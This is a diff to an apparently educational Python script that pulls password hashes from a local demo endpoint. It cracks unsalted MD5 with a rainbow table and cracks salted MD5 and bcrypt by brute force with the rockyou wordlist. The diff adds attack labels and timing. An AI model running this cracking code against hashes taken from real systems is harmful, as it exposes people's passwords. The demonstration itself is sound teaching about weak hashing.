@@ -4,26 +4,32 @@ import json
 import os
 import requests
 import time
-from create_rainbow_table import create_rainbow_table
+from pwd_hash_extract_utils import create_rainbow_table, time_str
 
+TARGET_URL = "http://localhost:5000/users.js"
 
-target_url = "http://localhost:5000/users.js"
-print("\nChoose a hashing algorithm to demonstrate password extraction:\n1: MD5 (unsalted)\n2: MD5 (salted)\n3: bcrypt")
+print("\nChoose a hashing algorithm and an attack to demonstrate password extraction:"
+      "\n1: MD5 (unsalted) with rainbow table attack"
+      "\n2: MD5 (salted) with brute force attack"
+      "\n3: bcrypt with brute force attack")
 option = input("Enter option: ")
 if option == '1':
     hash_type = "pwd_hash_md5_unsalted"
     hash_type_str = "MD5 (unsalted)"
+    attack_str = "Rainbow Table"
 elif option == '2':
     hash_type = "pwd_hash_md5_salted"
     hash_type_str = "MD5 (salted)"
+    attack_str = "Brute-force"
 else:
     option = '3'
     hash_type = "pwd_hash_bcrypt"
     hash_type_str = "bcrypt"
+    attack_str = "Brute-force"
 
 # format leaked data from response to a password hash list
 # code adapted from: https://stackoverflow.com/questions/22367473/extract-javascript-information-from-url-with-python
-exposedUserData_raw = requests.get(target_url + f"?pwd_choice={hash_type}")
+exposedUserData_raw = requests.get(TARGET_URL + f"?pwd_choice={hash_type}")
 exposedUserData_raw_str = exposedUserData_raw.text  # get text from response
 
 # extract the list as a string so it can be jason-parsed
@@ -31,19 +37,23 @@ exposedUserData_str = exposedUserData_raw_str[exposedUserData_raw_str.find("["):
 exposedUserData = json.loads(exposedUserData_str)   # parse json & return a dict
 
 exposed_hashes_set = {user["password"] if option != '3' else user["password"].encode() for user in exposedUserData}
-print(f"\nHashing algorithm: {hash_type_str}")
+print(f"\nHashing algorithm: {hash_type_str}\nAttack: {attack_str}")
 print("\nExposed hashes:")
 for hash_ in exposed_hashes_set:
     print(f"\t{hash_}" if option == '3' else f"\t'{hash_}'")
 total_exposed_hashes = len(exposed_hashes_set)  # for time estimates (bcrypt)
 exposed_hashes_cracked = total_exposed_hashes   # for tracking
 
-# read passwords from rockyou.txt & store them in rockyou_pwds
-rockyou_filepath = "rocku_1st1k.txt"    # use "rockyou.txt" for full list
+# read passwords from rockyou(_1st_1k).txt & store them in rockyou_pwds;
+# (UN)COMMENT THE RESPECTIVE FILE THAT YOU WANT TO USE BELOW:
+rockyou_filepath = "rockyou_1st1k.txt"  # reduced list of first 1,000 passwords from 'rockyou.txt'; it is provided.
+# rockyou_filepath = "rockyou.txt"    # full list of 14,000,000 passwords; not provided for space concerns.
+# it can be downloaded from: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+# and then pasted in this same directory
 with open(rockyou_filepath, "r", errors="ignore") as pwd_file:
     rockyou_pwds_raw = pwd_file.readlines()
 
-print("\nProcessing hashes. Please be patient...\n")
+print("\nProcessing hashes. Please be patient...")
 
 # remove trailing newline character & encode every rockyou password to set it up for hashing
 rockyou_pwds = []
@@ -56,13 +66,18 @@ total_passwords = len(rockyou_pwds)     # to use for time estimates
 if option == '1':   # rainbow attack on md5 unsalted hashes
     # create rainbow table if it doesn't exist
     rainbow_table_filepath = "rainbow_table.json"
-    if not os.path.exists(rainbow_table_filepath):
+    if os.path.exists(rainbow_table_filepath):
+        print("\nRainbow table exists.")
+    else:
+        print("\nRainbow table does not exist. Creating it...")
         create_rainbow_table(rainbow_table_filepath, rockyou_filepath)
 
-    print("\nTable attack starting...")
     # read pre-computed rainbow table from file to dict
     with open(rainbow_table_filepath, "r") as rainbow_file:
         md5_rainbow_table = json.load(rainbow_file)
+
+    print("\nTable attack starting...")
+    start_time = time.time()
 
     # look up exposed hashes in 'hash table': this simulates the table attack itself
     for exposed_hash in exposed_hashes_set:
@@ -72,6 +87,9 @@ if option == '1':   # rainbow attack on md5 unsalted hashes
             exposed_hashes_cracked -= 1
 
 elif option == '2':     # brute-force on md5 salted hashes
+    print("\nBrute-force attack starting...")
+    start_time = time.time()
+
     total_combinations_1byte = 256    # 2^8 possible combinations
     iterations_const = 10000000
     total_comparisons = total_passwords * total_combinations_1byte
@@ -95,8 +113,9 @@ elif option == '2':     # brute-force on md5 salted hashes
 
                 current_rate = iterations_const / elapsed_time
                 remaining_pwds = total_comparisons - pwd_count
-                time_estimate_mins = remaining_pwds / (current_rate * 60)
-                print(f"Passwords tried: {pwd_count}. Estimated time left (mins): {time_estimate_mins:.2f}")
+                time_estimate = remaining_pwds / current_rate
+                print(f"Passwords tried: {pwd_count}. "
+                      f"Estimated remaining time: {time_str(time_estimate, rockyou_filepath, option)}.")
 
             hash_md5_salted = hashlib.md5(salt + pwd).hexdigest()  # generate hash
             if hash_md5_salted in exposed_hashes_set:
@@ -109,6 +128,9 @@ elif option == '2':     # brute-force on md5 salted hashes
             break
 
 else:   # brute-force on bcrypt hashes
+    print("\nBrute-force attack starting...")
+    start_time = time.time()
+
     iterations_const = 50   # constant to check time rate against
 
     # iterate over each exposed hash
@@ -131,9 +153,10 @@ else:   # brute-force on bcrypt hashes
 
                 current_rate = iterations_const / elapsed_time
                 remaining_pwds = total_passwords - pwd_count
-                time_estimate_hrs = remaining_pwds / (current_rate * 3600)
+                time_estimate = remaining_pwds / current_rate
                 print(f"Passwords tried: {pwd_count}. "
-                      f"Estimated remaining time for this hash: {time_estimate_hrs:.2f} hours. ", end='')
+                      f"Estimated remaining time for this hash: "
+                      f"{time_str(time_estimate, rockyou_filepath, option)}. ", end='')
                 print(f"Exposed hashes left: {total_exposed_hashes}"
                       if total_exposed_hashes > 0 else "Trying last exposed hash.")
 
@@ -147,3 +170,6 @@ if exposed_hashes_cracked == 0:
     print("\nAll hashes were succesfully cracked.")
 else:
     print(f"\nUnable to crack {exposed_hashes_cracked} {'hashes' if exposed_hashes_cracked > 1 else 'hash'}.")
+
+total_time = time.time() - start_time
+print(f"\nTotal time of attack: {time_str(total_time, rockyou_filepath, option)}.")
